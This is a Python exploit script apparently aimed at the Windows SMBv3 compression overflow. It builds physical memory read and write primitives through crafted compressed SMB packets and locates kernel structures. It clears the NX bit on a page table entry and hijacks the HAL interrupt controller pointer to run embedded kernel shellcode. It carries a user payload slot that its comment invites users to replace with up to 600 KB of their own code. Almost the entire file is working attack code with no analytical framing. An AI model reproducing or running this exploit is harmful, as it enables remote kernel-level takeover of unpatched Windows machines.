#!/usr/bin/env python

import sys
import socket
import struct


from lznt1 import compress, compress_evil
from smb_win import smb_negotiate, smb_compress

# Use lowstub jmp bytes to signature search
LOWSTUB_JMP = 0x1000600E9
# Offset of PML4 pointer in lowstub
PML4_LOWSTUB_OFFSET = 0xA0
# Offset of lowstub virtual address in lowstub
SELFVA_LOWSTUB_OFFSET = 0x78

# Offset of hal!HalpApicRequestInterrupt pointer in hal!HalpInterruptController
HALP_APIC_REQ_INTERRUPT_OFFSET = 0x78

KUSER_SHARED_DATA = 0xFFFFF78000000000

# Offset of pNetRawBuffer in SRVNET_BUFFER_HDR
PNET_RAW_BUFF_OFFSET = 0x18
# Offset of pMDL1 in SRVNET_BUFFER_HDR
PMDL1_OFFSET = 0x38

# Shellcode from kernel_shellcode.asm
KERNEL_SHELLCODE = b"\x41\x50\x41\x51\x41\x55\x41\x57\x41\x56\x51\x52\x53\x56\x57\x4C"
KERNEL_SHELLCODE += b"\x8D\x35\xB5\x02\x00\x00\x49\x8B\x86\xD8\x00\x00\x00\x49\x8B\x9E"
KERNEL_SHELLCODE += b"\xE0\x00\x00\x00\x48\x89\x18\xFB\x48\x31\xC9\x44\x0F\x22\xC1\xB9"
KERNEL_SHELLCODE += b"\x82\x00\x00\xC0\x0F\x32\x25\x00\xF0\xFF\xFF\x48\xC1\xE2\x20\x48"
KERNEL_SHELLCODE += b"\x01\xD0\x48\x2D\x00\x10\x00\x00\x66\x81\x38\x4D\x5A\x75\xF3\x49"
KERNEL_SHELLCODE += b"\x89\xC7\x4D\x89\x3E\xBF\x78\x7C\xF4\xDB\xE8\xE4\x00\x00\x00\x49"
KERNEL_SHELLCODE += b"\x89\xC5\xBF\x3F\x5F\x64\x77\xE8\x38\x01\x00\x00\x48\x89\xC1\xBF"
KERNEL_SHELLCODE += b"\xE1\x14\x01\x17\xE8\x2B\x01\x00\x00\x48\x89\xC2\x48\x83\xC2\x08"
KERNEL_SHELLCODE += b"\x49\x8D\x74\x0D\x00\xE8\x09\x01\x00\x00\x3D\xD8\x83\xE0\x3E\x74"
KERNEL_SHELLCODE += b"\x0A\x4D\x8B\x6C\x15\x00\x49\x29\xD5\xEB\xE5\xBF\x48\xB8\x18\xB8"
KERNEL_SHELLCODE += b"\x4C\x89\xE9\xE8\x9B\x00\x00\x00\x49\x89\x46\x08\x4D\x8B\x45\x30"
KERNEL_SHELLCODE += b"\x4D\x8B\x4D\x38\x49\x81\xE8\xF8\x02\x00\x00\x48\x31\xF6\x49\x81"
KERNEL_SHELLCODE += b"\xE9\xF8\x02\x00\x00\x41\x8B\x79\x74\x0F\xBA\xE7\x04\x73\x05\x4C"
KERNEL_SHELLCODE += b"\x89\xCE\xEB\x0C\x4D\x39\xC8\x4D\x8B\x89\x00\x03\x00\x00\x75\xDE"
KERNEL_SHELLCODE += b"\x48\x85\xF6\x74\x49\x49\x8D\x4E\x10\x48\x89\xF2\x4D\x31\xC0\x4C"
KERNEL_SHELLCODE += b"\x8D\x0D\xC2\x00\x00\x00\x52\x41\x50\x41\x50\x41\x50\xBF\xC4\x5C"
KERNEL_SHELLCODE += b"\x19\x6D\x48\x83\xEC\x20\xE8\x38\x00\x00\x00\x48\x83\xC4\x40\x49"
KERNEL_SHELLCODE += b"\x8D\x4E\x10\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20\xB8\x05\x00\x00"
KERNEL_SHELLCODE += b"\x00\x44\x0F\x22\xC0\xE8\x19\x00\x00\x00\x48\x83\xC4\x20\xFA\x48"
KERNEL_SHELLCODE += b"\x89\xD8\x5F\x5E\x5B\x5A\x59\x41\x5E\x41\x5F\x41\x5D\x41\x59\x41"
KERNEL_SHELLCODE += b"\x58\xFF\xE0\xE8\x02\x00\x00\x00\xFF\xE0\x53\x51\x56\x41\x8B\x47"
KERNEL_SHELLCODE += b"\x3C\x4C\x01\xF8\x8B\x80\x88\x00\x00\x00\x4C\x01\xF8\x50\x8B\x48"
KERNEL_SHELLCODE += b"\x18\x8B\x58\x20\x4C\x01\xFB\xFF\xC9\x8B\x34\x8B\x4C\x01\xFE\xE8"
KERNEL_SHELLCODE += b"\x1F\x00\x00\x00\x39\xF8\x75\xEF\x58\x8B\x58\x24\x4C\x01\xFB\x66"
KERNEL_SHELLCODE += b"\x8B\x0C\x4B\x8B\x58\x1C\x4C\x01\xFB\x8B\x04\x8B\x4C\x01\xF8\x5E"
KERNEL_SHELLCODE += b"\x59\x5B\xC3\x52\x31\xC0\x99\xAC\xC1\xCA\x0D\x01\xC2\x85\xC0\x75"
KERNEL_SHELLCODE += b"\xF6\x92\x5A\xC3\xE8\xA1\xFF\xFF\xFF\x80\x78\x02\x80\x77\x05\x0F"
KERNEL_SHELLCODE += b"\xB6\x40\x03\xC3\x8B\x40\x03\xC3\x41\x57\x41\x56\x57\x56\x48\x8B"
KERNEL_SHELLCODE += b"\x05\x0E\x01\x00\x00\x48\x8B\x48\x18\x48\x8B\x49\x20\x48\x8B\x09"
KERNEL_SHELLCODE += b"\x66\x83\x79\x48\x18\x75\xF6\x48\x8B\x41\x50\x81\x78\x0C\x33\x00"
KERNEL_SHELLCODE += b"\x32\x00\x75\xE9\x4C\x8B\x79\x20\xBF\x5E\x51\x5E\x83\xE8\x58\xFF"
KERNEL_SHELLCODE += b"\xFF\xFF\x49\x89\xC6\x4C\x8B\x3D\xCF\x00\x00\x00\x31\xC0\x48\x8D"
KERNEL_SHELLCODE += b"\x15\x96\x01\x00\x00\x89\xC1\x48\xF7\xD1\x49\x89\xC0\xB0\x40\x50"
KERNEL_SHELLCODE += b"\xC1\xE0\x06\x50\x49\x89\x01\x48\x83\xEC\x20\xBF\xEA\x99\x6E\x57"
KERNEL_SHELLCODE += b"\xE8\x1E\xFF\xFF\xFF\x48\x83\xC4\x30\x48\x8B\x3D\x6B\x01\x00\x00"
KERNEL_SHELLCODE += b"\x48\x8D\x35\x77\x00\x00\x00\xB9\x1D\x00\x00\x00\xF3\xA4\x48\x8D"
KERNEL_SHELLCODE += b"\x35\x6E\x01\x00\x00\xB9\x58\x02\x00\x00\xF3\xA4\x48\x8D\x0D\xE0"
KERNEL_SHELLCODE += b"\x00\x00\x00\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x4D\x31\xC0\x4C"
KERNEL_SHELLCODE += b"\x8D\x0D\x46\x00\x00\x00\x41\x50\x6A\x01\x48\x8B\x05\x2A\x01\x00"
KERNEL_SHELLCODE += b"\x00\x50\x41\x50\x48\x83\xEC\x20\xBF\xC4\x5C\x19\x6D\xE8\xC1\xFE"
KERNEL_SHELLCODE += b"\xFF\xFF\x48\x83\xC4\x40\x48\x8D\x0D\xA6\x00\x00\x00\x4C\x89\xF2"
KERNEL_SHELLCODE += b"\x4D\x31\xC9\xBF\x34\x46\xCC\xAF\x48\x83\xEC\x20\xE8\xA2\xFE\xFF"
KERNEL_SHELLCODE += b"\xFF\x48\x83\xC4\x20\x5E\x5F\x41\x5E\x41\x5F\xC3\x90\xC3\x48\x92"
KERNEL_SHELLCODE += b"\x31\xC9\x51\x51\x49\x89\xC9\x4C\x8D\x05\x0D\x00\x00\x00\x89\xCA"
KERNEL_SHELLCODE += b"\x48\x83\xEC\x20\xFF\xD0\x48\x83\xC4\x30\xC3\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58"
KERNEL_SHELLCODE += b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x00\x00\x00\x00\x00"
KERNEL_SHELLCODE += b"\x00\x00\x00"

# PUT ON USER PAYLOAD YOUR PAYLOAD. MAX 600 KB. Deafult payload: touch c:/fucked.txt

USER_PAYLOAD =  b""
USER_PAYLOAD += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
USER_PAYLOAD += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
USER_PAYLOAD += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
USER_PAYLOAD += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
USER_PAYLOAD += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
USER_PAYLOAD += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
USER_PAYLOAD += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
USER_PAYLOAD += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
USER_PAYLOAD += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
USER_PAYLOAD += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
USER_PAYLOAD += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
USER_PAYLOAD += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
USER_PAYLOAD += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
USER_PAYLOAD += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
USER_PAYLOAD += b"\xff\xd5\x74\x6f\x75\x63\x68\x20\x63\x3a\x2f\x66\x75"
USER_PAYLOAD += b"\x63\x6b\x65\x64\x2e\x74\x78\x74\x00"


PML4_SELFREF = 0
PHAL_HEAP = 0
PHALP_INTERRUPT = 0
PHALP_APIC_INTERRUPT = 0
PNT_ENTRY = 0

max_read_retry = 3
overflow_val = 0x1100
write_unit = 0xd0
pmdl_va = KUSER_SHARED_DATA + 0x900
pmdl_mapva = KUSER_SHARED_DATA + 0x800
pshellcodeva = KUSER_SHARED_DATA + 0x950


class MDL:
    def __init__(self, map_va, phys_addr):
        self.next = struct.pack("<Q", 0x0)
        self.size = struct.pack("<H", 0x48)
        self.mdl_flags = struct.pack("<H", 0x5018)
        self.alloc_processor = struct.pack("<H", 0x0)
        self.reserved = struct.pack("<H", 0x0)
        self.process = struct.pack("<Q", 0x0)
        self.map_va = struct.pack("<Q", map_va)
        map_va &= ~0xFFF
        self.start_va = struct.pack("<Q", map_va)
        self.byte_count = struct.pack("<L", 0x258)
        self.byte_offset = struct.pack("<L", (phys_addr & 0xFFF) + 0x4)
        phys_addr_enc = (phys_addr & 0xFFFFFFFFFFFFF000) >> 12
        self.phys_addr1 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr2 = struct.pack("<Q", phys_addr_enc)
        self.phys_addr3 = struct.pack("<Q", phys_addr_enc)

    def raw_bytes(self):
        mdl_bytes = self.next + self.size + self.mdl_flags + \
                    self.alloc_processor + self.reserved + self.process + \
                    self.map_va + self.start_va + self.byte_count + \
                    self.byte_offset + self.phys_addr1 + self.phys_addr2 + \
                    self.phys_addr3
        return mdl_bytes


def reconnect(ip, port):
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(7)
    sock.connect((ip, port))
    return sock


def write_primitive(ip, port, data, addr):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    sock.recv(1000)
    uncompressed_data = b"\x41"*(overflow_val - len(data))
    uncompressed_data += b"\x00"*PNET_RAW_BUFF_OFFSET
    uncompressed_data += struct.pack('<Q', addr)
    compressed_data = compress(uncompressed_data)
    smb_compress(sock, compressed_data, 0xFFFFFFFF, data)
    sock.close()


def write_srvnet_buffer_hdr(ip, port, data, offset):
    sock = reconnect(ip, port)
    smb_negotiate(sock)
    sock.recv(1000)
    compressed_data = compress_evil(data)
    dummy_data = b"\x33"*(overflow_val + offset)
    smb_compress(sock, compressed_data, 0xFFFFEFFF, dummy_data)
    sock.close()


def read_physmem_primitive(ip, port, phys_addr):
    i = 0
    while i < max_read_retry:
        i += 1
        buff = try_read_physmem_primitive(ip, port, phys_addr)
        if buff is not None:
            return buff


def try_read_physmem_primitive(ip, port, phys_addr):
    fake_mdl = MDL(pmdl_mapva, phys_addr).raw_bytes()
    write_primitive(ip, port, fake_mdl, pmdl_va)
    write_srvnet_buffer_hdr(ip, port, struct.pack('<Q', pmdl_va), PMDL1_OFFSET)

    i = 0
    while i < max_read_retry:
        i += 1
        sock = reconnect(ip, port)
        smb_negotiate(sock)
        buff = sock.recv(1000)
        sock.close()
        if buff[4:8] != b"\xfeSMB":
            return buff


def get_phys_addr(ip, port, va_addr):
    pml4_index = (((1 << 9) - 1) & (va_addr >> (40 - 1)))
    pdpt_index = (((1 << 9) - 1) & (va_addr >> (31 - 1)))
    pdt_index = (((1 << 9) - 1) & (va_addr >> (22 - 1)))
    pt_index = (((1 << 9) - 1) & (va_addr >> (13 - 1)))

    pml4e = PML4 + pml4_index*0x8
    pdpt_buff = read_physmem_primitive(ip, port, pml4e)

    if pdpt_buff is None:
        print("[-] physical read primitive failed")
        sys.exit()
    pdpt = struct.unpack("<Q", pdpt_buff[0:8])[0] & 0xFFFFF000
    pdpte = pdpt + pdpt_index*0x8
    pdt_buff = read_physmem_primitive(ip, port, pdpte)

    if pdt_buff is None:
        print("[-] physical read primitive failed")
        sys.exit()
    pdt = struct.unpack("<Q", pdt_buff[0:8])[0] & 0xFFFFF000
    pdte = pdt + pdt_index*0x8
    pt_buff = read_physmem_primitive(ip, port, pdte)

    if pt_buff is None:
        print("[-] physical read primitive failed")
        sys.exit()
    pt = struct.unpack("<Q", pt_buff[0:8])[0]
    
    if pt & (1 << (8 - 1)):
        phys_addr = (pt & 0xFFFFF000) + (pt_index & 0xFFF)*0x1000 + (va_addr & 0xFFF)
        return phys_addr
    else:
        pt = pt & 0xFFFFF000

    pte = pt + pt_index*0x8
    pte_buff = read_physmem_primitive(ip, port, pte)

    if pte_buff is None:
        print("[-] physical read primitive failed")
        sys.exit()
    phys_addr = (struct.unpack("<Q", pte_buff[0:8])[0] & 0xFFFFF000) + \
                (va_addr & 0xFFF)

    return phys_addr


def get_pte_va(addr):
    pt = addr >> 9
    lb = (0xFFFF << 48) | (PML4_SELFREF << 39)
    ub = ((0xFFFF << 48) | (PML4_SELFREF << 39) +
          0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8
    pt = pt | lb
    pt = pt & ub

    return pt


def overwrite_pte(ip, port, addr):
    phys_addr = get_phys_addr(ip, port, addr)

    buff = read_physmem_primitive(ip, port, phys_addr)

    if buff is None:
        print("[-] read primitive failed!")
        sys.exit()
    pte_val = struct.unpack("<Q", buff[0:8])[0]

    # Clear NX bit
    overwrite_val = pte_val & (((1 << 63) - 1))
    overwrite_buff = struct.pack("<Q", overwrite_val)

    write_primitive(ip, port, overwrite_buff, addr)


def build_shellcode():
    global KERNEL_SHELLCODE
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_INTERRUPT +
                                    HALP_APIC_REQ_INTERRUPT_OFFSET)
    KERNEL_SHELLCODE += struct.pack("<Q", PHALP_APIC_INTERRUPT)
    KERNEL_SHELLCODE += USER_PAYLOAD


def search_hal_heap(ip, port):
    global PHALP_INTERRUPT
    global PHALP_APIC_INTERRUPT
    search_len = 0x10000

    index = PHAL_HEAP
    page_index = PHAL_HEAP
    cons = 0
    phys_addr = 0

    while index < PHAL_HEAP + search_len:

        # It seems that pages in the HAL heap are not necessarily contiguous in physical memory, 
        # so we try to reduce number of reads like this 
        
        if not (index & 0xFFF):
            phys_addr = get_phys_addr(ip, port, index)
        else:
            phys_addr = (phys_addr & 0xFFFFFFFFFFFFF000) + (index & 0xFFF)

        buff = read_physmem_primitive(ip, port, phys_addr)

        if buff is None:
            print("[-] physical read primitive failed!")
            sys.exit()
        entry_indices = 8*(((len(buff) + 8 // 2) // 8) - 1)
        i = 0
        
        # This heuristic seems to be OK to find HalpInterruptController, but could use improvement
        while i < entry_indices:
            entry = struct.unpack("<Q", buff[i:i+8])[0]
            i += 8
            if (entry & 0xFFFFFF0000000000) != 0xFFFFF80000000000:
                cons = 0
                continue
            cons += 1
            if cons > 3:
                PHALP_INTERRUPT = index + i - 0x40
                print("[+] found HalpInterruptController at %lx"
                      % PHALP_INTERRUPT)

                if len(buff) < i + 0x40:
                    buff = read_physmem_primitive(ip, port, phys_addr + i + 0x38)
                    PHALP_APIC_INTERRUPT = struct.unpack("<Q", buff[0:8])[0]
                    
                    if buff is None:
                        print("[-] physical read primitive failed!")
                        sys.exit()
                else:
                    PHALP_APIC_INTERRUPT = struct.unpack("<Q",buff[i + 0x38:i+0x40])[0]
                
                print("[+] found HalpApicRequestInterrupt at %lx" % PHALP_APIC_INTERRUPT)
                
                return
        index += entry_indices

    print("[-] failed to find HalpInterruptController!")
    sys.exit()

def search_selfref(ip, port):
    search_len = 0x1000
    index = PML4

    while search_len:
        buff = read_physmem_primitive(ip, port, index)
        if buff is None:
            return
        entry_indices = 8*(((len(buff) + 8 // 2) // 8) - 1)
        i = 0
        while i < entry_indices:
            entry = struct.unpack("<Q",buff[i:i+8])[0] & 0xFFFFF000
            if entry == PML4:
                return index + i
            i += 8
        search_len -= entry_indices
        index += entry_indices


def find_pml4_selfref(ip, port):
    global PML4_SELFREF
    self_ref = search_selfref(ip, port)

    if self_ref is None:
        print("[-] failed to find PML4 self reference entry!")
        sys.exit()
    PML4_SELFREF = (self_ref & 0xFFF) >> 3

    print("[+] found PML4 self-ref entry %0x" % PML4_SELFREF)


def find_low_stub(ip, port):
    global PML4
    global PHAL_HEAP

    limit = 0x100000
    index = 0x1000

    while index < limit:
        buff = read_physmem_primitive(ip, port, index)

        if buff is None:
            print("[-] physical read primitive failed!")
            sys.exit()


        entry = struct.unpack("<Q", buff[0:8])[0] & 0xFFFFFFFFFFFF00FF

        if entry == LOWSTUB_JMP:
            print("[+] found low stub at phys addr %lx!" % index)
            PML4 = struct.unpack("<Q", buff[PML4_LOWSTUB_OFFSET: PML4_LOWSTUB_OFFSET + 8])[0]
            print("[+] PML4 at %lx" % PML4)
            PHAL_HEAP = struct.unpack("<Q", buff[SELFVA_LOWSTUB_OFFSET:SELFVA_LOWSTUB_OFFSET + 8])[0] & 0xFFFFFFFFF0000000
            print("[+] base of HAL heap at %lx" % PHAL_HEAP)
            return

        index += 0x1000

    print("[-] Failed to find low stub in physical memory!")
    sys.exit()

def do_rce(ip, port):
    find_low_stub(ip, port)
    find_pml4_selfref(ip, port)
    search_hal_heap(ip, port)
    
    build_shellcode()

    print("[+] built shellcode!")

    pKernelUserSharedPTE = get_pte_va(KUSER_SHARED_DATA)
    print("[+] KUSER_SHARED_DATA PTE at %lx" % pKernelUserSharedPTE)

    overwrite_pte(ip, port, pKernelUserSharedPTE)
    print("[+] KUSER_SHARED_DATA PTE NX bit cleared!")
    
    # TODO: figure out why we can't write the entire shellcode data at once. There is a check before srv2!Srv2DecompressData preventing the call of the function.
    to_write = len(KERNEL_SHELLCODE)
    write_bytes = 0
    while write_bytes < to_write:
        write_sz = min([write_unit, to_write - write_bytes])
        write_primitive(ip, port, KERNEL_SHELLCODE[write_bytes:write_bytes + write_sz], pshellcodeva + write_bytes)
        write_bytes += write_sz
    
    print("[+] Wrote shellcode at %lx!" % pshellcodeva)


    
    write_primitive(ip, port, struct.pack("<Q", pshellcodeva), PHALP_INTERRUPT + HALP_APIC_REQ_INTERRUPT_OFFSET)
    print("[+] overwrote HalpInterruptController pointer, should have execution shortly...")
    




